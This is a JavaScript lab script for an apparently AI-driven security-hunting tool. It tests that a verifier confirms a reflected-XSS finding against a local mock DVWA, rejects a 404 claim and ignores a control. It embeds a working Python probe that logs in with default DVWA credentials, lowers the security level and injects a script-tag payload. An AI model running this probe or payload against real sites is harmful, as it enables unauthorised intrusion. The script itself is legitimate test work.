// GATE-INTERESTING-XSS lab (28 Oct 2026, gate-interesting-xss lane, W6).
//
// Proves, against a LOCAL mock DVWA (no docker, no Meta, $0, no live
// hunt or backend touched), that the parent's live reflected-XSS claim
// now reaches the verification pipeline and CONFIRMS — the claim the
// old pre-filter discarded as 'not-interesting' before the verifier
// ever ran (live: DVWA hunt h_830317bdc184, parent-as-brain, 28 Oct).
//
//   (A) XSS CLAIM REPLAY — the parent's exact evidence + exact command
//       (`python3 /opt/hunt/parent_brain_xss.py PBRN7719`) through the
//       REAL assessResult. The claim now passes the pre-filter (the
//       xss-reflect signal) and CONFIRMS via the canary rule: the
//       marker PBRN7719 is in the command and the re-run reproduces
//       the reflected line.
//   (B) 404 STILL FAILS — the Juice Shop /rest/admin/* 404 claim
//       still does not verify (error-page re-run + content-relevance).
//       The step-2 protection is intact.
//   (C) CONTROL IS NOT A FINDING — the control evidence (plain marker,
//       no script tag) still returns null as 'not-interesting'.
//
// HOW THE RE-RUN WORKS (no docker in this sandbox — state it plainly):
// assessResult re-runs plan.command via execInHuntContainer, which
// shells out to the `docker` CLI. The lab installs a fake `docker`
// shim on PATH (temp dir, prepended): `docker inspect` reports the
// container running, and `docker exec <name> sh -c <cmd>` runs <cmd>
// locally in the sandbox with DM_DVWA_BASE pointed at the mock DVWA.
// The probe script (a faithful copy of the parent's, at the exact path
// /opt/hunt/parent_brain_xss.py the command names) reads its base URL
// from DM_DVWA_BASE (default: the real http://172.17.0.1:3100). So the
// re-run executes the EXACT command string against the local mock.
// The re-run is a LOCAL execution, not a container execution.
//
// Usage: node scripts/lab-gate-interesting-xss.mjs
// Exit 0 when every check passes, 1 otherwise.
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';

// DATA_DIR must be set BEFORE huntAgent (via store) is imported.
const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'lab-gate-interesting-xss-'));
process.env.DATA_DIR = tmpRoot;

const { assessResult } = await import('../src/huntAgent.js');

const failures = [];
function check(name, cond, detail = '') {
  if (cond) {
    console.log(`  PASS ${name}`);
  } else {
    console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ''}`);
    failures.push(name);
  }
}

// ---------------------------------------------------------------------------
// Mock DVWA — the shape of the real target, on 127.0.0.1.
// Login + security-low + reflected XSS (raw, no escaping, low security).
// ---------------------------------------------------------------------------
const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://127.0.0.1');
  if (u.pathname === '/login.php' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<html><body><form method="post"><input type='hidden' name='user_token' value='MOCKTOKEN123'><input name="username"><input name="password" type="password"><input type="submit" name="Login" value="Login"></form></body></html>`);
    return;
  }
  if (u.pathname === '/login.php' && req.method === 'POST') {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      res.writeHead(200, { 'Content-Type': 'text/html', 'Set-Cookie': 'PHPSESSID=mocklab; Path=/' });
      res.end('<html><body>Welcome to Damn Vulnerable Web Application (DVWA) — <a href="/index.php">index.php</a></body></html>');
    });
    return;
  }
  if (u.pathname === '/security.php' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<html><body><form method="post"><input type='hidden' name='user_token' value='MOCKTOKEN456'><select name="security"><option value="low">low</option></select><input type="submit" name="seclev_submit" value="Submit"></form></body></html>`);
    return;
  }
  if (u.pathname === '/security.php' && req.method === 'POST') {
    req.resume();
    req.on('end', () => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<html><body>Security level set to low.</body></html>');
    });
    return;
  }
  if (u.pathname === '/vulnerabilities/xss_r/') {
    // Low security: the name parameter is reflected raw, unescaped.
    const name = u.searchParams.get('name') || '';
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<html><body><pre>Hello ${name}</pre></body></html>`);
    return;
  }
  if (u.pathname.startsWith('/rest/admin/')) {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /rest/admin/application-version was not found on this server.</p>');
    return;
  }
  res.writeHead(404, { 'Content-Type': 'text/html' });
  res.end('Not Found');
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const PORT = server.address().port;
const BASE = `http://127.0.0.1:${PORT}`;
console.log(`mock DVWA listening on ${BASE}`);
process.env.DM_DVWA_BASE = BASE;

// ---------------------------------------------------------------------------
// The parent's probe script, faithful copy, at the exact path the
// command names. Base URL comes from DM_DVWA_BASE (default: the real
// DVWA) so the same script runs against the mock in this lab.
// ---------------------------------------------------------------------------
const PROBE_SCRIPT = `import requests, re, sys
import os
B = os.environ.get('DM_DVWA_BASE', 'http://172.17.0.1:3100')
marker = sys.argv[1] if len(sys.argv) > 1 else 'PBRN7719'
payload = sys.argv[2] if len(sys.argv) > 2 else '<sCrIpT>alert(1)</sCrIpT>'
s = requests.Session()
r = s.get(B + '/login.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok = t.group(1) if t else ''
d = {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': tok}
r = s.post(B + '/login.php', data=d, timeout=10)
r = s.get(B + '/security.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok2 = t.group(1) if t else ''
r = s.post(B + '/security.php', data={'security': 'low', 'seclev_submit': 'Submit', 'user_token': tok2}, timeout=10)
r = s.get(B + '/vulnerabilities/xss_r/?name=' + marker + payload, timeout=10)
print('xss_r', r.status_code, 'len', len(r.text))
print('RAW marker present:', marker in r.text, '| script tag present:', '<sCrIpT>' in r.text)
for line in r.text.split('\\n'):
    if marker in line:
        print('REFLECTED LINE:', line.strip()[:220])
`;
const PROBE_PATH = '/opt/hunt/parent_brain_xss.py';
fs.mkdirSync('/opt/hunt', { recursive: true });
fs.writeFileSync(PROBE_PATH, PROBE_SCRIPT);
console.log(`probe script written to ${PROBE_PATH}`);

// ---------------------------------------------------------------------------
// Fake `docker` shim on PATH: inspect reports running; exec runs the
// command locally (sandbox), inheriting DM_DVWA_BASE.
// ---------------------------------------------------------------------------
const shimDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lab-fake-docker-'));
const shimPath = path.join(shimDir, 'docker');
fs.writeFileSync(shimPath, `#!/bin/sh
# Fake docker for the W6 lab: no docker in this sandbox.
if [ "$1" = "inspect" ]; then echo "true"; exit 0; fi
if [ "$1" = "exec" ]; then shift; shift; exec "$@"; fi
echo "fake-docker: unsupported: $*" >&2; exit 1
`);
fs.chmodSync(shimPath, 0o755);
process.env.PATH = `${shimDir}:${process.env.PATH}`;
console.log('fake docker shim on PATH (inspect -> true, exec -> local sh)');

// ---------------------------------------------------------------------------
// Hunt scaffolding under the temp DATA_DIR.
// ---------------------------------------------------------------------------
const HUNT_ID = 'h_lab_gate_interesting_xss';
const huntDir = path.join(tmpRoot, 'hunts', HUNT_ID);
fs.mkdirSync(huntDir, { recursive: true });
fs.writeFileSync(path.join(huntDir, 'meta.json'), JSON.stringify({
  id: HUNT_ID, target: `${BASE}/`, mode: 'human', state: 'paused', iteration: 247,
}, null, 2));
fs.writeFileSync(path.join(huntDir, 'events.jsonl'), '');
fs.writeFileSync(path.join(huntDir, 'reasoning.jsonl'), '');

function readEvents() {
  const p = path.join(huntDir, 'events.jsonl');
  if (!fs.existsSync(p)) return [];
  return fs.readFileSync(p, 'utf8').split('\n').filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
}

// The parent's exact evidence + exact command.
const XSS_EVIDENCE = [
  'xss_r 200 len 4388',
  'RAW marker present: True | script tag present: True',
  'REFLECTED LINE: <pre>Hello PBRN7719<sCrIpT>alert(1)</sCrIpT></pre>',
].join('\n');
const XSS_COMMAND = 'python3 /opt/hunt/parent_brain_xss.py PBRN7719';
const CONTROL_EVIDENCE = [
  'xss_r 200 len 4363',
  'RAW marker present: True | script tag present: False',
  'REFLECTED LINE: <pre>Hello PBRN7719</pre>',
].join('\n');
const NOT_FOUND_BODY = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /rest/admin/application-version was not found on this server.</p>';
const NOT_FOUND_COMMAND = `curl -sk '${BASE}/rest/admin/application-version'`;

// ---------------------------------------------------------------------------
// (A) XSS claim replay — the parent's exact claim through assessResult.
// ---------------------------------------------------------------------------
console.log('\n(A) XSS claim replay (exact evidence + exact command, real assessResult)');
const recA = await assessResult(HUNT_ID, `${BASE}/`, {
  test: 'Reflected XSS in /vulnerabilities/xss_r name parameter',
  command: XSS_COMMAND,
  why: 'Human-mode claim - the hunter reproduced this itself and asked for independent verification.',
  hypothesis: 'Reflected XSS in /vulnerabilities/xss_r name parameter',
}, { stdout: XSS_EVIDENCE, stderr: '', code: 0 });
console.log(`  assessResult returned: ${recA ? `verified=${recA.verified} verdict=${recA.verification}` : 'null'}`);
check('the claim passes the pre-filter (not null, not not-interesting)', recA !== null, recA === null ? 'returned null — pre-filter still rejects it' : '');
const validationA = readEvents().filter((e) => e.type === 'validation').at(-1);
check('no not-interesting validation was recorded for the XSS claim', !validationA || validationA.verdict !== 'not-interesting', validationA ? `verdict=${validationA.verdict}` : '');
check('the claim CONFIRMS (verified=true)', recA !== null && recA.verified === true, recA ? `verified=${recA.verified} verdict=${recA.verification}` : 'null');
const findingA = readEvents().find((e) => e.type === 'finding' && /xss_r/.test(String(e.title || '')));
check('a verified finding event was recorded', Boolean(findingA && findingA.verified === true), findingA ? `verified=${findingA.verified}` : 'no finding event');

// ---------------------------------------------------------------------------
// (B) 404 still fails.
// ---------------------------------------------------------------------------
console.log('\n(B) 404 error page still fails');
const recB = await assessResult(HUNT_ID, `${BASE}/`, {
  test: 'Admin application-version variant sweep',
  command: NOT_FOUND_COMMAND,
  why: 'Human-mode claim - the hunter reproduced this itself and asked for independent verification.',
  hypothesis: 'Admin application-version variant sweep',
}, { stdout: NOT_FOUND_BODY, stderr: '', code: 0 });
console.log(`  assessResult returned: ${recB ? `verified=${recB.verified} verdict=${recB.verification}` : 'null'}`);
check('the 404 claim does NOT verify', recB === null || recB.verified !== true, recB ? `verified=${recB.verified}` : 'null (rejected before recording)');
const findingB = readEvents().find((e) => e.type === 'finding' && /application-version/.test(String(e.title || '')));
check('no verified finding event for the 404 claim', !findingB || findingB.verified !== true, findingB ? `verified=${findingB.verified}` : 'none');

// ---------------------------------------------------------------------------
// (C) Control is not a finding.
// ---------------------------------------------------------------------------
console.log('\n(C) control evidence is not a finding');
const recC = await assessResult(HUNT_ID, `${BASE}/`, {
  test: 'Reflected XSS in /vulnerabilities/xss_r name parameter',
  command: XSS_COMMAND,
  why: 'Human-mode claim - control baseline.',
  hypothesis: 'Reflected XSS in /vulnerabilities/xss_r name parameter',
}, { stdout: CONTROL_EVIDENCE, stderr: '', code: 0 });
console.log(`  assessResult returned: ${recC ? `verified=${recC.verified} verdict=${recC.verification}` : 'null'}`);
check('the control returns null as not-interesting', recC === null, recC ? `verified=${recC.verified}` : '');
const validationC = readEvents().filter((e) => e.type === 'validation').at(-1);
check('the control validation is not-interesting', validationC && validationC.verdict === 'not-interesting', validationC ? `verdict=${validationC.verdict}` : 'none');

server.close();
try { fs.unlinkSync(PROBE_PATH); } catch { /* best-effort cleanup */ }
console.log(`\n${failures.length === 0 ? 'ALL CHECKS PASSED' : `${failures.length} CHECK(S) FAILED: ${failures.join(', ')}`}`);
console.log('NOTE: the re-run executed LOCALLY via the fake docker shim against the mock DVWA, not in a real hunt container.');
process.exit(failures.length === 0 ? 0 : 1);
